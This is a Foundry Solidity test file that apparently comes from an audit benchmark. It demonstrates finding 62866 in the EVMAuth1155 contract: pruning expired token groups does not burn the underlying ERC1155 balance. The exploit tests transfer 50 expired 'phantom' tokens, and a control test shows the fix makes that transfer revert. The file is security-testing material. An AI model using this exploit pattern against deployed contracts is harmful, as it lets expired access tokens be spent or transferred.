// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    EVMAuth1155,
    EVMAuth1155Fixed,
    MarkerToken
} from "./62866-expired-token-groups-not-synchronized-with-erc1155-balance-t.sol";

// Radius Technology EVMAuth finding 62866:
// "Expired token groups not synchronized with ERC1155 balance tracking".
//
// `_pruneGroups` removes expired records from the custom expiration ledger and
// emits `ExpiredTokensBurned`, but never burns the underlying ERC1155 balance.
// Expired auth tokens therefore remain spendable/transferable — a phantom
// balance that should have been destroyed.
contract ExpiredGroupDesyncTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ALICE = address(0xA11cE);
    uint256 internal constant TOKEN_ID = 1;

    // ── Main exploit: run() drives the full desync + phantom transfer ──
    function test_exploit_expiredTokensRemainTransferable() public {
        Exploit e = new Exploit();
        e.run();

        EVMAuth1155 token = EVMAuth1155(e.tokenAddr());

        // Desync after prune: the expiration ledger is emptied to 0, but the
        // authoritative ERC1155 balance still shows the full 100 tokens.
        assertEq(e.aliceGroupBalanceAfterPrune(), 0, "group tracking pruned to zero");
        assertEq(e.aliceErc1155AfterPrune(), 100, "phantom ERC1155 balance survives prune");

        // The transfer of expired tokens settles against the authoritative
        // ERC1155 balance and SUCCEEDS: 50 phantom tokens reach the SINK.
        assertEq(e.sinkErc1155AfterTransfer(), 50, "50 expired tokens transferred to SINK");
        assertEq(token.balanceOf(SINK, TOKEN_ID), 50, "SINK holds 50 phantom expired tokens");
        assertEq(e.aliceErc1155AfterTransfer(), 50, "Alice retains 50 phantom expired tokens");

        // The marker records the harm magnitude at the SINK.
        MarkerToken marker = MarkerToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 50, "marker records 50 phantom tokens at SINK");
        assertEq(e.sinkMarkerBalance(), 50, "exploit-recorded marker matches");
    }

    // ── Negative control: the fix burns the underlying balance, so the same
    //    transfer of expired tokens reverts with insufficient balance ──
    function test_control_fixedPruneBurnsUnderlying_transferReverts() public {
        EVMAuth1155Fixed token = new EVMAuth1155Fixed();

        // 100 already-expired tokens (expiresAt == now => expired).
        token.mintWithExpiry(ALICE, TOKEN_ID, 100, block.timestamp);

        // Fixed prune burns the underlying ERC1155 balance in lockstep.
        token.prune(ALICE, TOKEN_ID);

        assertEq(token.groupBalanceOf(ALICE, TOKEN_ID), 0, "group tracking pruned");
        assertEq(token.balanceOf(ALICE, TOKEN_ID), 0, "underlying ERC1155 balance burned in sync");

        // Transferring the (now destroyed) expired tokens reverts: no phantom balance.
        vm.prank(ALICE);
        vm.expectRevert();
        token.safeTransferFrom(ALICE, SINK, TOKEN_ID, 50, "");

        assertEq(token.balanceOf(SINK, TOKEN_ID), 0, "SINK receives nothing under the fix");
    }

    // ── Faithful full scenario: mint with a real TTL, warp past expiry,
    //    prune, then transfer 50 expired tokens (matches the finding exactly) ──
    function test_exploit_faithfulScenario_mintTtlWarpTransfer() public {
        EVMAuth1155 token = new EVMAuth1155();

        // Alice has 100 auth tokens with a 60-second TTL.
        uint256 ttl = 60;
        token.mintWithExpiry(ALICE, TOKEN_ID, 100, block.timestamp + ttl);

        // Before expiry both ledgers agree.
        assertEq(token.balanceOf(ALICE, TOKEN_ID), 100, "erc1155 balance before expiry");
        assertEq(token.groupBalanceOf(ALICE, TOKEN_ID), 100, "group balance before expiry");

        // Tokens expire.
        vm.warp(block.timestamp + ttl + 1);

        // Prune removes the expired groups but leaves the ERC1155 balance intact.
        token.prune(ALICE, TOKEN_ID);
        assertEq(token.groupBalanceOf(ALICE, TOKEN_ID), 0, "group pruned after expiry");
        assertEq(token.balanceOf(ALICE, TOKEN_ID), 100, "phantom ERC1155 balance remains");

        // Alice transfers 50 expired tokens to the SINK (the "Bob" recipient).
        vm.prank(ALICE);
        token.safeTransferFrom(ALICE, SINK, TOKEN_ID, 50, "");

        assertEq(token.balanceOf(SINK, TOKEN_ID), 50, "SINK holds 50 expired tokens");
        assertEq(token.balanceOf(ALICE, TOKEN_ID), 50, "Alice retains 50 expired tokens");
    }
}
